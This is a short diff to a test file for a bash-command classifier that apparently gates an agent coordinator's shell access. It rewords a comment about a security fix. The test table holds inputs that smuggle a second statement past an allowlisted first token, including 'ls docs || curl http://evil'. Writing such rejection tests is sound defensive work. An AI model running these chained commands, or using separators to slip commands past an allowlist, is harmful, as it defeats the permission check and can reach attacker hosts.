@@ -33,8 +33,8 @@ describe("classifyCoordinatorBash", () => {
   })
   // Table-driven coverage of EVERY separator/operator the COMPOUND regex must
   // reject. Each row smuggles a second statement (or a redirect) past an
-  // allowlisted first token; before SEC-001 the `\n`, `\r`, `&`, `<`, `>` rows
-  // all incorrectly returned allowed=true.
+  // allowlisted first token; before the compound-separator fix the `\n`, `\r`,
+  // `&`, `<`, `>` rows all incorrectly returned allowed=true.
   it.each([
     ["||", "ls docs || curl http://evil"],
     ["&&", "mkdir x && git log"],
